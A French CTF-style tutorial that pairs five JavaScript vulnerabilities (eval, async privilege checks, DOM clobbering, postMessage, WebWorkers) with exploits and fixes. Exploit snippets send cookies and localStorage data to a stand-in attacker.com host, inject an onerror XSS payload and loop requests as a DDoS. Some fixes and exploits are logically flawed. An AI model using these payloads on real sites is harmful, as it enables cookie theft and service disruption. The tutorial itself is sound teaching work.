# Vulnérabilités JavaScript pour CTF - Partie 2

## 1. Injection via eval()

### Code Vulnérable
```javascript
function calculateResult() {
    const userFormula = document.getElementById('calculator').value;
    const result = eval(userFormula);
    document.getElementById('result').textContent = result;
}
```

### Explication
L'utilisation de `eval()` sur des entrées utilisateur est extrêmement dangereuse car elle exécute directement du code JavaScript. Un attaquant peut injecter n'importe quel code JavaScript qui sera exécuté dans le contexte de la page.

### Exploitation
```javascript
// Entrée malicieuse dans le champ calculatrice
fetch('https://attacker.com?' + document.cookie)

// Ou plus subtil
(function(){new Image().src='https://attacker.com/'+btoa(document.cookie)})()
```

### Solution Sécurisée
```javascript
function calculateResult() {
    const userFormula = document.getElementById('calculator').value;
    // Utiliser une bibliothèque mathématique sécurisée ou
    // valider strictement l'entrée avec des regex
    if (!/^[0-9+\-*/(). ]*$/.test(userFormula)) {
        throw new Error('Formule invalide');
    }
    const result = Function('return ' + userFormula)();
    document.getElementById('result').textContent = result;
}
```

## 2. Race Condition sur Vérification de Privilèges

### Code Vulnérable
```javascript
let isAdmin = false;

async function checkAdminStatus() {
    const response = await fetch('/api/checkAdmin');
    isAdmin = await response.json();
}

function deleteUser(userId) {
    if (!isAdmin) {
        return console.error('Permission denied');
    }
    fetch(`/api/users/${userId}`, { method: 'DELETE' });
}

// Au chargement
checkAdminStatus();
```

### Explication
La vérification des privilèges est asynchrone, mais l'utilisation est synchrone. Un attaquant peut exploiter le délai entre le chargement de la page et la vérification des privilèges.

### Exploitation
```javascript
// Script qui spamme la fonction deleteUser avant que checkAdmin ne finisse
(async function exploit() {
    const victims = ['user1', 'user2', 'user3'];
    for(const victim of victims) {
        deleteUser(victim);
        await new Promise(r => setTimeout(r, 10));
    }
})();
```

### Solution Sécurisée
```javascript
async function deleteUser(userId) {
    const isAdmin = await checkAdminStatus(); // Vérifie à chaque appel
    if (!isAdmin) {
        throw new Error('Permission denied');
    }
    return fetch(`/api/users/${userId}`, { method: 'DELETE' });
}
```

## 3. DOM Clobbering

### Code Vulnérable
```javascript
// config.js
if (!window.config) {
    window.config = {
        isAdmin: false,
        apiKey: 'default-key'
    };
}

// usage.js
function checkAdmin() {
    return window.config.isAdmin;
}
```

### Explication
Le DOM Clobbering exploite la possibilité de créer des éléments HTML qui interfèrent avec les variables JavaScript globales. Cette vulnérabilité permet de remplacer des objets de configuration ou des fonctions.

### Exploitation
```html
<!-- Injecté dans la page avant le chargement de config.js -->
<form id="config">
    <input name="isAdmin" value="true">
    <input name="apiKey" value="hacked">
</form>
```

### Solution Sécurisée
```javascript
// Utiliser un namespace privé
const Config = (function() {
    const config = {
        isAdmin: false,
        apiKey: 'default-key'
    };
    
    return {
        get: (key) => config[key],
        isAdmin: () => config.isAdmin
    };
})();
```

## 4. Injection via postMessage

### Code Vulnérable
```javascript
window.addEventListener('message', function(event) {
    const data = event.data;
    document.getElementById('content').innerHTML = data.content;
});
```

### Explication
L'API postMessage permet la communication entre fenêtres/frames. Sans vérification d'origine et de contenu, un attaquant peut injecter du HTML malveillant depuis une autre origine.

### Exploitation
```javascript
// Depuis une autre fenêtre/frame
const targetWindow = window.opener || window.parent;
targetWindow.postMessage({
    content: '<img src=x onerror="alert(document.cookie)">'
}, '*');
```

### Solution Sécurisée
```javascript
window.addEventListener('message', function(event) {
    // Vérifier l'origine
    if (event.origin !== 'https://trusted-domain.com') {
        return;
    }
    
    // Valider et assainir le contenu
    const data = event.data;
    const sanitized = DOMPurify.sanitize(data.content);
    document.getElementById('content').innerHTML = sanitized;
});
```

## 5. WebWorker Code Injection

### Code Vulnérable
```javascript
function createWorker(userScript) {
    const blob = new Blob([userScript], { type: 'application/javascript' });
    const worker = new Worker(URL.createObjectURL(blob));
    return worker;
}
```

### Explication
La création dynamique de WebWorkers à partir d'entrées utilisateur peut permettre l'exécution de code arbitraire dans un contexte isolé, mais avec accès à certaines APIs sensibles.

### Exploitation
```javascript
const maliciousCode = `
    // Exfiltrer des données
    fetch('https://attacker.com/steal?' + 
        encodeURIComponent(localStorage.getItem('sensitive')));
        
    // Ou lancer une attaque DDoS
    while(true) {
        fetch('https://target.com/');
    }
`;

createWorker(maliciousCode);
```

### Solution Sécurisée
```javascript
// Utiliser des workers prédéfinis
const trustedWorkers = {
    'calculator': '/workers/calculator.js',
    'imageProcessor': '/workers/image.js'
};

function createWorker(workerName) {
    if (!trustedWorkers[workerName]) {
        throw new Error('Worker non autorisé');
    }
    return new Worker(trustedWorkers[workerName]);
}
```

## Ressources Complémentaires

- [DOM Clobbering](https://portswigger.net/web-security/dom-based)
- [Web Workers API Security](https://developer.mozilla.org/docs/Web/API/Web_Workers_API/Using_web_workers#Security_considerations)
- [PostMessage Security](https://developer.mozilla.org/docs/Web/API/Window/postMessage#Security_concerns)